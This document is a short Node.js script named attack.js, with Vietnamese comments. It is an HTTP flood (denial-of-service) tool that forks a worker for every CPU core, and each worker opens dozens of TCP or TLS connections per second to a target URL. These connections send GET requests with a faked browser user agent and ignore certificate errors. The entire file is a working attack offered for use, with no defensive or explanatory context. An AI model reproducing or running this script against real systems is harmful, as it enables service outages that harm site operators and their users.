const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const os = require('os');

const [,, target, seconds = 30] = process.argv;
if (!target) return console.error('Dùng: node attack.js <URL> [giây]');

const { hostname, port = 443, protocol, pathname = '/' } = new URL(target);
const isHttps = protocol === 'https:';
const portNum = parseInt(port) || (isHttps ? 443 : 80);

function g() { // gửi 1 request
  const s = isHttps
    ? tls.connect({ host: hostname, port: portNum, rejectUnauthorized: false })
    : net.connect({ host: hostname, port: portNum });
  s.on('connect', () => {
    s.write(`GET ${pathname} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n`);
    setTimeout(() => s.destroy(), 1000);
  });
  s.on('error', () => {});
}

if (cluster.isMaster) {
  for (let i = 0; i < os.cpus().length; i++) cluster.fork();
  setTimeout(() => process.exit(0), seconds * 1000);
} else {
  setInterval(() => {
    for (let i = 0; i < 15 + Math.random() * 20; i++) g();
  }, 200);
}
